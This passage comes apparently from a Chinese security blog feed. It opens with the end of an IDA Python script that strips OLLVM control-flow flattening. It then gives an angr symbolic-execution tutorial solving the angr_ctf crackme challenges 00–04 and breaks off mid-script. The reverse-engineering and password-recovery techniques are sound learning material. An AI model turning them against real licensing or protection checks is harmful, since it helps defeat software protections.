class="hljs-string">&#x27;0x427d8&#x27;</span>], <span class="hljs-string">&#x27;0x428c0&#x27;</span>: [<span class="hljs-string">&#x27;0x4266c&#x27;</span>], <span class="hljs-string">&#x27;0x428e4&#x27;</span>: [<span class="hljs-string">&#x27;0x42958&#x27;</span>, <span class="hljs-string">&#x27;0x42808&#x27;</span>], <span class="hljs-string">&#x27;0x42918&#x27;</span>: [<span class="hljs-string">&#x27;0x429e8&#x27;</span>], <span class="hljs-string">&#x27;0x42930&#x27;</span>: [<span class="hljs-string">&#x27;0x42794&#x27;</span>], <span class="hljs-string">&#x27;0x42958&#x27;</span>: [<span class="hljs-string">&#x27;0x424b0&#x27;</span>], <span class="hljs-string">&#x27;0x4299c&#x27;</span>: [<span class="hljs-string">&#x27;0x425b8&#x27;</span>], <span class="hljs-string">&#x27;0x429bc&#x27;</span>: [<span class="hljs-string">&#x27;0x4299c&#x27;</span>], <span class="hljs-string">&#x27;0x429d8&#x27;</span>: [<span class="hljs-string">&#x27;0x42a48&#x27;</span>], <span class="hljs-string">&#x27;0x429e8&#x27;</span>: [<span class="hljs-string">&#x27;0x42518&#x27;</span>], <span class="hljs-string">&#x27;0x42a04&#x27;</span>: [<span class="hljs-string">&#x27;0x42860&#x27;</span>], <span class="hljs-string">&#x27;0x42a1c&#x27;</span>: [<span class="hljs-string">&#x27;0x429bc&#x27;</span>], <span class="hljs-string">&#x27;0x42a2c&#x27;</span>: [<span class="hljs-string">&#x27;0x4262c&#x27;</span>, <span class="hljs-string">&#x27;0x429d8&#x27;</span>], <span class="hljs-string">&#x27;0x42ab0&#x27;</span>: []&#125;<br><br>patch_branch(patch_list)<br><br><br>func_ea =<span class="hljs-number">0x41D08</span><br>real_blocks = [<span class="hljs-number">269576</span>, <span class="hljs-number">269728</span>, <span class="hljs-number">269844</span>, <span class="hljs-number">269936</span>, <span class="hljs-number">270092</span>, <span class="hljs-number">270180</span>, <span class="hljs-number">270252</span>, <span class="hljs-number">270348</span>, <span class="hljs-number">270424</span>, <span class="hljs-number">270516</span>, <span class="hljs-number">270588</span>, <span class="hljs-number">270636</span>, <span class="hljs-number">270652</span>, <span class="hljs-number">270676</span>, <span class="hljs-number">270768</span>, <span class="hljs-number">270788</span>, <span class="hljs-number">270808</span>, <span class="hljs-number">270832</span>, <span class="hljs-number">270856</span>, <span class="hljs-number">270876</span>, <span class="hljs-number">270908</span>, <span class="hljs-number">272968</span>, <span class="hljs-number">273000</span>, <span class="hljs-number">273024</span>, <span class="hljs-number">273040</span>, <span class="hljs-number">270936</span>, <span class="hljs-number">271096</span>, <span class="hljs-number">271208</span>, <span class="hljs-number">271324</span>, <span class="hljs-number">271444</span>, <span class="hljs-number">271536</span>, <span class="hljs-number">271640</span>, <span class="hljs-number">271728</span>, <span class="hljs-number">271800</span>, <span class="hljs-number">271916</span>, <span class="hljs-number">271980</span>, <span class="hljs-number">272072</span>, <span class="hljs-number">272152</span>, <span class="hljs-number">272276</span>, <span class="hljs-number">272344</span>, <span class="hljs-number">272392</span>, <span class="hljs-number">272480</span>, <span class="hljs-number">272496</span>, <span class="hljs-number">272552</span>, <span class="hljs-number">272576</span>, <span class="hljs-number">272612</span>, <span class="hljs-number">272664</span>, <span class="hljs-number">272688</span>, <span class="hljs-number">272728</span>, <span class="hljs-number">272796</span>, <span class="hljs-number">272828</span>, <span class="hljs-number">272856</span>, <span class="hljs-number">272872</span>, <span class="hljs-number">272900</span>, <span class="hljs-number">272924</span>, <span class="hljs-number">272940</span>, <span class="hljs-number">273072</span>]<br>patch_useless_blocks(func_ea,real_blocks)<br>ida_funcs.reanalyze_function(ida_funcs.get_func(func_ea))<span class="hljs-comment">#刷新函数控制流图</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;控制流图已刷新&quot;</span>)<br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Angr</tag>
      
      <tag>OLLVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Angr 符号执行 模拟执行</title>
    <link href="/2025/10/02/angr/"/>
    <url>/2025/10/02/angr/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>angr 是一个多架构的二进制分析工具包，能够对二进制文件执行动态符号执行（如 Mayhem、KLEE 等）和各种静态分析；angr 的核心特性包括控制流图（CFG）恢复、污点分析、符号执行、路径探索以及自动漏洞挖掘等，使用 Python 编写，接口灵活，适合快速搭建复杂的二进制分析工具</p><h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p>输入: 符号变量X → 程序执行 → 收集所有可能的路径和约束条件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 当程序读取输入时，angr 创建符号变量</span><br>input_symbol = angr.BVS(<span class="hljs-string">&#x27;stdin_0&#x27;</span>, <span class="hljs-number">64</span>)  <span class="hljs-comment"># 64位符号变量</span><br><br><span class="hljs-comment"># 程序执行过程中收集约束条件</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">input</span> == <span class="hljs-string">&quot;HelloAngr&quot;</span>:<br>    goto good_address  <span class="hljs-comment"># 这个路径到达我们的目标</span><br><span class="hljs-keyword">else</span>:<br>    goto bad_address   <span class="hljs-comment"># 这个路径不是我们要的</span><br></code></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m venv angr_env<br><span class="hljs-built_in">source</span> angr_env/bin/activate<br>pip install angr<br></code></pre></td></tr></table></figure><p>本文章的 angr 版本是 9.2.177</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>参考 <a href="https://github.com/jakespringer/angr_ctf">jakespringer&#x2F;angr_ctf</a></p><h4 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [esp+23h] [ebp-15h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+2Ch] [ebp-Ch]</span><br><br>  v6 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%8s&quot;</span>, s1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )<br>    s1[i] = complex_function(s1[i], i);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;JACEJGCS&quot;</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good Job.&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try again.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">complex_function</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( a1 &lt;= <span class="hljs-number">64</span> || a1 &gt; <span class="hljs-number">90</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try again.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">3</span> * a2 + a1 - <span class="hljs-number">65</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键汇编</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048675</span> loc_8048675:                            <span class="hljs-comment">; CODE XREF: main+9A↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048675</span>                 <span class="hljs-keyword">sub</span>     esp, <span class="hljs-number">0</span>Ch<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048678</span>                 <span class="hljs-keyword">push</span>    offset aGoodJob <span class="hljs-comment">; &quot;Good Job.&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804867</span>D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048682</span>                 <span class="hljs-keyword">add</span>     esp, <span class="hljs-number">10</span>h<br></code></pre></td></tr></table></figure><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    <span class="hljs-comment"># 创建 Angr 项目</span><br>    path_to_binary = <span class="hljs-string">&quot;./00_angr_find&quot;</span> <span class="hljs-comment"># 文件路径</span><br>    project = angr.Project(path_to_binary)<br><br>    <span class="hljs-comment"># 设置初始状态</span><br>    initial_state = project.factory.entry_state() <span class="hljs-comment"># 从程序入口点开始执行</span><br><br>    <span class="hljs-comment"># 创建模拟管理器</span><br>    simulation = project.factory.simgr(initial_state) <span class="hljs-comment"># simulation_manager,管理程序执行不同的路径</span><br><br>    <span class="hljs-comment"># 符号执行搜索</span><br>    print_good_address = <span class="hljs-number">0x0804867D</span> <span class="hljs-comment"># 打印 &quot;Good Job&quot; 的地址</span><br>    simulation.explore(find=print_good_address)<br><br>    <span class="hljs-comment"># 检查是否找到</span><br>    <span class="hljs-keyword">if</span> simulation.found:  <span class="hljs-comment"># 包含所有到达目标地址的状态列表</span><br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno())) <span class="hljs-comment"># 提取该状态下输入到 stdin 的内容</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p>运行结果可以看到成功找到了解决方案并且得到正确输入</p><p><img src="/../images/angr/00.png"></p><h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><p>用反编译器查看 main 函数时会反编译失败，提示 “The function is too large to analyze”</p><blockquote><p>查看源码这道题应该是因为定义了一个巨大的宏字符串常量，宏展开导致 main 内嵌了超大字符串，编译后 main 变成超大函数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> USERDEF <span class="hljs-string">&quot;&#123;&#123; userdef &#125;&#125;&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEN_USERDEF &#123;&#123; len_userdef &#125;&#125;</span><br><br><span class="hljs-built_in">strncpy</span>(password, USERDEF, LEN_USERDEF);<br></code></pre></td></tr></table></figure><p>字符串搜索找到 “Good Job” 的地方</p><p><img src="/../images/angr/01.png"></p><p>为了节省时间提高分析效率，在这里可以使用到 angr 中的 avoid 功能</p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./01_angr_avoid&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    <span class="hljs-comment"># 从程序入口开始执行并初始化程序的内存布局，寄存器状态</span><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    print_good_address = <span class="hljs-number">0x080485e5</span> <span class="hljs-comment"># 打印 &quot;Good Job&quot; 的地址</span><br>    will_not_succeed_address = <span class="hljs-number">0x080485ef</span> <span class="hljs-comment"># should_succeed 检查失败跳转的地址,会从这里一直跳转到打印 &quot;Try again&quot;</span><br><br>    simulation.explore(find=print_good_address, avoid=will_not_succeed_address)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/01.1.png"><br><img src="/../images/angr/01.2.png"></p><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><p>反编译看一下</p><p><img src="/../images/angr/02.png"></p><p>先用 00 的方法试一下,find 的地址直接取了 main 函数中输出 “Good Job” 的地址 0x08049012</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./02_angr_find_condition&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    print_good_address = <span class="hljs-number">0x08049012</span><br><br>    simulation.explore(find=print_good_address)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p>直接成功了</p><p><img src="/../images/angr/02.1.png"></p><p>看看官方解答<br>在不知道具体的成功指令地址，只知道成功特征（比如输出 “Good Job”）的情况下，可以通过设置条件来找到满足特定条件的路径</p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./02_angr_find_condition&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful,avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p>依旧能得到正确结果</p><p><img src="/../images/angr/02.2.png"></p><h3 id="03-angr-symbolic-register"><a href="#03-angr-symbolic-register" class="headerlink" title="03_angr_symbolic_register"></a>03_angr_symbolic_register</h3><p><img src="/../images/angr/03.png"></p><p>其中的三个 complex_function 就是很复杂的三个函数</p><p><img src="/../images/angr/03.0.png"></p><p>直接找输出 “Good Job” 的地址 0x080489ee</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./03_angr_symbolic_registers&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    print_good_address = <span class="hljs-number">0x080489ee</span><br><br>    simulation.explore(find=print_good_address)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p>可以得到正确结果</p><p><img src="/../images/angr/03.1.png"></p><p>这道题的背景应该是针对旧版本的 Angr，当 scanf 读取多个输入时，例如 scanf(“%u %u”)，Angr 内置的 scanf 不能直接模拟，需要手动创建符号变量并将其存储在正确的内存位置或寄存器中</p><p>大概是如下的模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy <span class="hljs-comment">#  angr 的约束求解器，用于创建符号变量</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./03_angr_symbolic_registers&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    start_address = <span class="hljs-number">0x08048937</span> <span class="hljs-comment"># scanf 调用之后第一次访问输入数据的地址</span><br>    initial_state = project.factory.blank_state(addr=start_address)<br><br>    <span class="hljs-comment"># 创建符号位向量</span><br>    password0_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># 32位整数</span><br>    password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, password0_size_in_bits)<br>    password1_size_in_bits = <span class="hljs-number">32</span><br>    password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, password1_size_in_bits)<br>    password2_size_in_bits = <span class="hljs-number">32</span><br>    password2 = claripy.BVS(<span class="hljs-string">&#x27;password2&#x27;</span>, password2_size_in_bits)<br><br>    <span class="hljs-comment"># 将符号变量注入寄存器</span><br>    initial_state.regs.eax = password0<br>    initial_state.regs.ebx = password1<br>    initial_state.regs.edx = password2<br><br>    <span class="hljs-comment"># 创建符号执行管理器</span><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br>    <br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        solution0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password0)<br>        solution1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password1)<br>        solution2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password2)<br><br>        solution = <span class="hljs-string">&quot;&#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(solution0,solution1,solution2)<br>        <span class="hljs-built_in">print</span>(solution)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><h3 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h3><p>搜索字符串定位输出到 “Good Job” 的地址 080486e9</p><p><img src="/../images/angr/04.png"></p><p>和之前的脚本一样，只需要改个 path 和 print_good_address</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./04_angr_symbolic_stack&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = 